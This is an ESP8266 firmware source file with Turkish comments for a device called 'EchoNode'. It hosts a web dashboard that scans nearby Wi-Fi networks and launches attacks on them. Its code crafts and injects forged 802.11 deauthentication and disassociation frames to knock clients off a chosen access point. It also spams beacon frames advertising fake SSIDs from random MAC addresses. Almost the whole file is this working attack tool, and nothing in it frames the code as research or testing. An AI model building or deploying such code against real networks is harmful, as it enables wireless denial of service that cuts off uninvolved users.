#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include "Dashboard_gz.h"

extern "C" {
  #include "user_interface.h"
}

// ==================== YAPILANDIRMA ====================
const char* AP_SSID     = "EchoNode_Admin";
const char* AP_PASSWORD = "StrongPassword123";

AsyncWebServer server(80);

// ==================== SALDIRI DURUMLARI ====================
bool deauthRunning = false;
uint8_t deauthBSSID[6];
uint8_t deauthChannel = 1;

bool beaconRunning = false;

// Kullanici SSID'leri
#define MAX_SSIDS 20
#define MAX_SSID_LEN 33
char customSSIDs[MAX_SSIDS][MAX_SSID_LEN];
int customSSIDCount = 0;

// Asenkron tarama durumu
bool scanInProgress = false;
unsigned long scanTriggerTime = 0;
String lastScanResult = "[]";

// ==================== DEAUTH FRAME ====================
uint8_t deauthFrame[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

// ==================== BEACON FRAME ====================
uint8_t beaconFrame[128] = {
  0x80, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x31, 0x04,
  0x00,
  0x08,
};

// ==================== YARDIMCI FONKSIYONLAR ====================

void parseMac(const String &macStr, uint8_t *mac) {
  int values[6];
  sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
         &values[0], &values[1], &values[2],
         &values[3], &values[4], &values[5]);
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
}

void randomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(256);
  mac[0] &= 0xFE;
  mac[0] |= 0x02;
}

String encTypeStr(uint8_t encType) {
  switch (encType) {
    case ENC_TYPE_NONE:  return "OPEN";
    case ENC_TYPE_WEP:   return "WEP";
    case ENC_TYPE_TKIP:  return "WPA";
    case ENC_TYPE_CCMP:  return "WPA2";
    case ENC_TYPE_AUTO:  return "AUTO";
    default:             return "?";
  }
}

void parseSSIDList(const String &body) {
  customSSIDCount = 0;
  int sIdx = body.indexOf("\"ssids\":\"");
  if (sIdx == -1) return;
  sIdx += 9;
  int eIdx = body.indexOf("\"", sIdx);
  if (eIdx == -1) return;

  String ssidData = body.substring(sIdx, eIdx);
  int start = 0;
  while (start < (int)ssidData.length() && customSSIDCount < MAX_SSIDS) {
    int nl = ssidData.indexOf("\\n", start);
    String ssid;
    if (nl == -1) {
      ssid = ssidData.substring(start);
      start = ssidData.length();
    } else {
      ssid = ssidData.substring(start, nl);
      start = nl + 2;
    }
    ssid.trim();
    if (ssid.length() > 0 && ssid.length() <= 32) {
      ssid.toCharArray(customSSIDs[customSSIDCount], MAX_SSID_LEN);
      customSSIDCount++;
    }
  }
}

// ==================== ASENKRON TARAMA ====================
// Tarama tamamlandiginda sonuclari JSON'a cevir ve sakla
void processScanResults() {
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_FAILED) {
    lastScanResult = "[]";
    scanInProgress = false;
    return;
  }
  if (n == WIFI_SCAN_RUNNING) {
    return; // hala taranıyor, bekliyoruz
  }

  // Tarama bitti, sonuclari isle
  String json = "[";
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"enc\":\"" + encTypeStr(WiFi.encryptionType(i)) + "\"";
    json += "}";
  }
  json += "]";
  WiFi.scanDelete();

  lastScanResult = json;
  scanInProgress = false;
}

// ==================== DEAUTH SALDIRISI ====================
void sendDeauth() {
  if (!deauthRunning) return;

  wifi_set_channel(deauthChannel);
  memcpy(&deauthFrame[10], deauthBSSID, 6);
  memcpy(&deauthFrame[16], deauthBSSID, 6);

  deauthFrame[0] = 0xC0;
  for (int i = 0; i < 3; i++) {
    wifi_send_pkt_freedom(deauthFrame, sizeof(deauthFrame), 0);
    delay(1);
    yield(); // WiFi stack'e nefes aldır
  }

  deauthFrame[0] = 0xA0;
  for (int i = 0; i < 3; i++) {
    wifi_send_pkt_freedom(deauthFrame, sizeof(deauthFrame), 0);
    delay(1);
    yield();
  }
}

// ==================== BEACON SPAM ====================
void sendBeacon() {
  if (!beaconRunning || customSSIDCount == 0) return;

  for (int i = 0; i < customSSIDCount; i++) {
    uint8_t mac[6];
    randomMAC(mac);
    memcpy(&beaconFrame[10], mac, 6);
    memcpy(&beaconFrame[16], mac, 6);

    int ssidLen = strlen(customSSIDs[i]);
    if (ssidLen > 32) ssidLen = 32;
    beaconFrame[37] = ssidLen;
    memcpy(&beaconFrame[38], customSSIDs[i], ssidLen);

    int pos = 38 + ssidLen;
    beaconFrame[pos++] = 0x03;
    beaconFrame[pos++] = 0x01;
    beaconFrame[pos++] = random(1, 14);

    wifi_set_channel(random(1, 14));
    wifi_send_pkt_freedom(beaconFrame, pos, 0);
    delay(1);
    yield(); // WiFi stack'e nefes aldır
  }
}

// ==================== SETUP ====================
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n\n--- EchoNode Booting ---");
  Serial.printf("CPU Freq: %d MHz\n", ESP.getCpuFreqMHz());

  WiFi.mode(WIFI_AP_STA);
  WiFi.setSleepMode(WIFI_NONE_SLEEP); // Wi-Fi uyku modunu kapat (Maksimum hiz)
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASSWORD, 6); // Kanal 6 (Daha az parazit)
  
  // COK ONEMLI: WiFi.disconnect(true) yaparsak istasyon arayuzunu tamamen kapatir ve tarama CALISMAZ!
  // Sadece otomatik baglanmayi kapatmak icin disconnect(false) yapiyoruz.
  WiFi.disconnect(false); 

  Serial.printf("AP Started. SSID: %s, IP: %s\n", AP_SSID, WiFi.softAPIP().toString().c_str());

  // ==================== WEB SUNUCUSU ====================

  // Ana sayfa - Gzip ile sıkıştırılmış HTML gönder
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.printf("[%lu] HTTP GET / -> Client: %s\n", millis(), request->client()->remoteIP().toString().c_str());
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", DASHBOARD_GZ, DASHBOARD_GZ_SIZE);
    response->addHeader("Content-Encoding", "gzip");
    response->addHeader("Cache-Control", "no-cache");
    request->send(response);
    Serial.printf("[%lu] HTTP GET / -> Gzip Response Scheduled (%d bytes)\n", millis(), DASHBOARD_GZ_SIZE);
  });

  // Arka plandaki telefon pinglerini/captive portal isteklerini hizla reddet (kilitlenmeyi onler)
  server.onNotFound([](AsyncWebServerRequest *request){
    Serial.printf("[%lu] 404 Not Found: %s\n", millis(), request->url().c_str());
    request->send(404, "text/plain", "Not Found");
  });

  // Sistem durumu
  server.on("/api/status", HTTP_GET, [](AsyncWebServerRequest *request){
    String json = "{";
    json += "\"chipId\":\"" + String(ESP.getChipId(), HEX) + "\",";
    json += "\"freeHeap\":" + String(ESP.getFreeHeap()) + ",";
    json += "\"flashSize\":" + String(ESP.getFlashChipRealSize()) + ",";
    json += "\"cpuFreq\":" + String(ESP.getCpuFreqMHz()) + ",";
    json += "\"uptime\":" + String(millis() / 1000) + ",";
    json += "\"clients\":" + String(wifi_softap_get_station_num());
    json += "}";
    request->send(200, "application/json", json);
  });

  // Wi-Fi Tarama BASLAT (Telefona koptugunu belli etmemek icin hile yapiyoruz)
  server.on("/api/scan", HTTP_GET, [](AsyncWebServerRequest *request){
    if (scanInProgress || scanTriggerTime > 0) {
      request->send(200, "application/json", "{\"scanning\":true}");
      return;
    }
    
    // Taramayi baslatma zamanini kaydet. 
    // Taramayi HEMEN baslatmiyoruz, cunku send() asenkron.
    // 500ms bekleyip TCP paketlerinin telefona ulasmasini sagliyoruz!
    scanTriggerTime = millis();
    if (scanTriggerTime == 0) scanTriggerTime = 1; // 0 olmasin
    request->send(200, "application/json", "{\"scanning\":true}");
  });

  // Tarama sonuclarini al
  server.on("/api/scan/results", HTTP_GET, [](AsyncWebServerRequest *request){
    if (scanInProgress) {
      request->send(200, "application/json", "{\"scanning\":true}");
    } else {
      request->send(200, "application/json", lastScanResult);
    }
  });

  // Deauth Baslat
  server.on("/api/deauth", HTTP_POST, [](AsyncWebServerRequest *request){},
    NULL,
    [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total){
      String body = String((char*)data).substring(0, len);

      int bIdx = body.indexOf("\"bssid\":\"");
      if (bIdx == -1) {
        request->send(400, "application/json", "{\"ok\":false,\"err\":\"no bssid\"}");
        return;
      }
      String bssid = body.substring(bIdx + 9, bIdx + 26);
      parseMac(bssid, deauthBSSID);

      int chIdx = body.indexOf("\"channel\":");
      if (chIdx != -1) {
        deauthChannel = body.substring(chIdx + 10, chIdx + 12).toInt();
      }

      wifi_promiscuous_enable(1);
      deauthRunning = true;
      request->send(200, "application/json", "{\"ok\":true}");
    }
  );

  // Deauth Durdur
  server.on("/api/deauth/stop", HTTP_GET, [](AsyncWebServerRequest *request){
    deauthRunning = false;
    if (!beaconRunning) wifi_promiscuous_enable(0);
    request->send(200, "application/json", "{\"ok\":true}");
  });

  // Beacon Baslat
  server.on("/api/beacon", HTTP_POST, [](AsyncWebServerRequest *request){},
    NULL,
    [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total){
      String body = String((char*)data).substring(0, len);
      parseSSIDList(body);

      if (customSSIDCount == 0) {
        request->send(400, "application/json", "{\"ok\":false,\"err\":\"no ssids\"}");
        return;
      }

      wifi_promiscuous_enable(1);
      beaconRunning = true;
      request->send(200, "application/json", "{\"ok\":true,\"count\":" + String(customSSIDCount) + "}");
    }
  );

  // Beacon Durdur
  server.on("/api/beacon/stop", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.printf("[%lu] API: Beacon Stop\n", millis());
    beaconRunning = false;
    if (!deauthRunning) wifi_promiscuous_enable(0);
    request->send(200, "application/json", "{\"ok\":true}");
  });

  server.begin();
  Serial.println("AsyncWebServer Started on port 80!");
}

// ==================== ANA DONGU ====================
void loop() {
  // Senkron Taramayi baslat (Istek geldikten 500ms sonra baslar ki HTTP yaniti telefona ulasabilsin!)
  if (scanTriggerTime > 0 && (millis() - scanTriggerTime > 500)) {
    scanTriggerTime = 0;
    scanInProgress = true;
    
    bool wasDeauth = deauthRunning;
    bool wasBeacon = beaconRunning;
    deauthRunning = false;
    beaconRunning = false;
    wifi_promiscuous_enable(0);
    delay(100);

    // SENKRON TARAMA
    // NOT: Ilk tarama genelde 0 doner (radyo isinmasi gerekiyor). Bu yuzden 0 donerse tekrar deniyoruz.
    int n = -1;
    for (int retry = 0; retry < 3; retry++) {
      Serial.printf("[%lu] Scan attempt %d...\n", millis(), retry + 1);
      n = WiFi.scanNetworks(false, true);
      Serial.printf("[%lu] Scan attempt %d result: %d networks\n", millis(), retry + 1, n);
      if (n > 0) break; // Ag bulduysa cik
      WiFi.scanDelete();
      delay(200); // Radyoya isinma suresi ver
    }

    if (n == WIFI_SCAN_FAILED || n == 0) {
      lastScanResult = "[]";
    } else {
      String json = "[";
      for (int i = 0; i < n; i++) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
        json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
        json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
        json += "\"channel\":" + String(WiFi.channel(i)) + ",";
        json += "\"enc\":\"" + encTypeStr(WiFi.encryptionType(i)) + "\"";
        json += "}";
      }
      json += "]";
      lastScanResult = json;
    }
    WiFi.scanDelete();
    
    if (wasDeauth || wasBeacon) {
      wifi_promiscuous_enable(1);
      deauthRunning = wasDeauth;
      beaconRunning = wasBeacon;
    }

    scanInProgress = false;
  }

  // Saldiri frame'lerini gonder
  if (deauthRunning) {
    sendDeauth();
  }
  if (beaconRunning) {
    sendBeacon();
  }

  // CPU'ya nefes aldir ama TCP yiginini yavaslatma
  delay(1);
}
